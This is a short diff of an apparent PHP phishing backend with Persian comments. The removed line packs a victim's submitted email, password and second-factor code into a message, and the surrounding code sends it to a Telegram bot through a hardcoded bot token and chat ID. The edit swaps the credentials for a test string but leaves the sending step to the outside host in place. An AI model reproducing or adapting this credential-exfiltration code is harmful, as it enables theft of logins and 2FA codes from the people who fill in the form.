@@ -29,7 +29,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         // ارسال اطلاعات به ربات تلگرام (این قسمت را با توکن و شناسه چت خود پر کنید)
         $token = "7985669297:AAEVfINvGGV4VX6iLLH1dLae8EsSdLJKPVY";
         $chatId = "-4614449543";
-        $message = "ایمیل: $email\nپسورد: $password\nفاکتور: $factor";
+        $message = "پیام تستی";
 
         // ارسال پاسخ به کاربر
         $send_url = "https://api.telegram.org/bot$token/sendMessage";
